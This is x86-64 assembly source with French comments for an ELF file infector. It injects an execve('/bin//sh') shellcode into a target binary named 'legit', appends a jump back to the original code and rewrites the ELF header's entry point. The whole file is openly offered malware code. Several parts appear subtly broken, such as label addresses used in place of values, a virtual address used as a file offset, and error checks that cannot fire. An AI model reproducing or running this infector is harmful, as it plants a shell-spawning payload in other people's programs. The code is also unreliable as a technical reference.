section .data
    filename db "legit", 0                   ; Nom du fichier à infecter
    new_entrypoint dq 0x401EE0              ; Adresse du shellcode injecté
    original_entry dq 0x401050              ; Adresse de l'entrypoint original
    shellcode db 0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, \
                 0x48, 0xF7, 0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, \
                 0x3B, 0x0F, 0x05           ; Ton shellcode
    jmp_back db 0xE9                        ; Opcode pour un JMP relatif
    jmp_offset dd 0                         ; Offset relatif pour revenir à l'entrypoint original
    err_open db "Erreur : ouverture de fichier", 0
    err_write db "Erreur : ecriture dans le fichier", 0
    err_close db "Erreur : fermeture du fichier", 0

section .text
    global _start

_start:
    ; Calculer l'offset pour le JMP
    mov rax, original_entry                 ; Adresse de l'entrypoint original
    sub rax, new_entrypoint + 32            ; Calculer l'offset (shellcode + JMP)
    sub rax, 5                              ; Correction pour la longueur de l'instruction JMP
    mov [jmp_offset], eax                   ; Stocker l'offset calculé

    ; Ouvrir le fichier ELF
    mov rax, 2                              ; SYS_OPEN
    mov rdi, filename                       ; Nom du fichier
    mov rsi, 2                              ; O_RDWR
    syscall
    jc error_open
    mov rbx, rax                            ; Sauvegarder le descripteur

    ; Écrire le shellcode et le JMP à `new_entrypoint`
    mov rax, 8                              ; SYS_LSEEK
    mov rdi, rbx                            ; Descripteur du fichier
    mov rsi, new_entrypoint                 ; Offset du nouvel entrypoint
    mov rdx, 0                              ; Déplacement absolu
    syscall
    jc error_write

    mov rax, 1                              ; SYS_WRITE
    mov rdi, rbx                            ; Descripteur
    mov rsi, shellcode                      ; Adresse du shellcode
    mov rdx, 27                             ; Taille du shellcode
    syscall
    jc error_write

    ; Écrire le JMP à la fin du shellcode
    mov rax, 1                              ; SYS_WRITE
    mov rdi, rbx                            ; Descripteur
    mov rsi, jmp_back                       ; Adresse du JMP
    mov rdx, 5                              ; Taille de l'instruction JMP (opcode + offset)
    syscall
    jc error_write

    ; Mettre à jour l'entrypoint dans l'en-tête ELF
    mov rax, 8                              ; SYS_LSEEK
    mov rdi, rbx                            ; Descripteur
    mov rsi, 24                             ; Offset de l'entrypoint dans ELF64
    mov rdx, 0                              ; Déplacement absolu
    syscall
    jc error_write

    mov rax, 1                              ; SYS_WRITE
    mov rdi, rbx                            ; Descripteur
    mov rsi, new_entrypoint                 ; Nouveau entrypoint
    mov rdx, 8                              ; Taille (64 bits)
    syscall
    jc error_write

    ; Fermer le fichier
    mov rax, 3                              ; SYS_CLOSE
    mov rdi, rbx                            ; Descripteur
    syscall
    jc error_close

exit:
    mov rax, 60                             ; SYS_EXIT
    xor rdi, rdi                            ; Code de sortie 0
    syscall

error_open:
    mov rsi, err_open
    call error

error_write:
    mov rsi, err_write
    call error

error_close:
    mov rsi, err_close
    call error

error:
    mov rax, 1                              ; SYS_WRITE
    mov rdi, 1                              ; STDOUT
    mov rdx, 28                             ; Taille du message
    syscall
    jmp exit
